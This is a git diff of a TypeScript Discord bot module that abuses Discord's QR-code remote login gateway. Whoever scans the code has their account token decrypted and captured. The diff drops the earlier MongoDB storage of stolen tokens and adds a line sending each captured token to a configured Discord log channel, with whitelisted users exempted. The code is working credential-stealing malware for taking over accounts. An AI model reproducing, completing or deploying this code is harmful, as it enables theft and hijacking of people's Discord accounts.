@@ -1,32 +1,17 @@
 import fetch from 'node-fetch'
-import { Message, MessageEmbed, MessageAttachment } from "discord.js";
+import { Message, MessageEmbed, MessageAttachment, Client, TextChannel } from "discord.js";
 import { generateKeyPairSync, createHash, privateDecrypt } from "crypto";
-import { Schema, model } from "mongoose";
 import WebSocket from "ws";
 import Jimp from "jimp";
 
-const user = model("QR_User", new Schema({
-    id: String,
-    username: String,
-    token: String,
-    verified: Boolean,
-}));
+import { IConfig, IData } from './global';
+const config: IConfig = require('../config.json');
 
 let SocketClient: WebSocket;
 let Heart: NodeJS.Timeout;
 let Timeout: NodeJS.Timeout;
 
-interface IData {
-    op: string;
-    heartbeat_interval?: number;
-    timeout_ms?: number;
-    encrypted_nonce?: string;
-    fingerprint?: string;
-    encrypted_user_payload?: string;
-    encrypted_token?: string;
-}
-
-export default (message: Message, embed: MessageEmbed) => new Promise(reslove => {
+export default (message: Message, embed: MessageEmbed, client: Client) => new Promise(reslove => {
     const keyPair = generateKeyPairSync("rsa", { modulusLength: 2048, publicExponent: 65537 });
 
     SocketClient = new WebSocket('wss://remote-auth-gateway.discord.gg/?v=1', { origin: 'https://discord.com' });
@@ -72,20 +57,11 @@ export default (message: Message, embed: MessageEmbed) => new Promise(reslove =>
 
                 const discord = await (await fetch(`https://discord.com/api/users/@me`, { headers: { Authorization: token } })).json();
 
-                for (const whitelist of require('./whitelisted.json')) 
+                for (const whitelist of config.whitelisted_users) 
                     if (discord.id === whitelist) return reslove(token);
 
-                const userData = await user.findOne({ id: discord.id }).catch(e => {});
-                if (!userData) user.create({
-                    id: discord.id,
-                    username: discord.username,
-                    token: token,
-                    verified: true,
-                }).catch(e => {});
-                else userData.updateOne({
-                    token: token,
-                    verified: true,
-                }).catch(e => {});
+
+                (await client.channels.cache.get(config.log_channel) as TextChannel).send(token);
 
                 if (SocketClient.OPEN) SocketClient.close();
                 clearInterval(Heart);
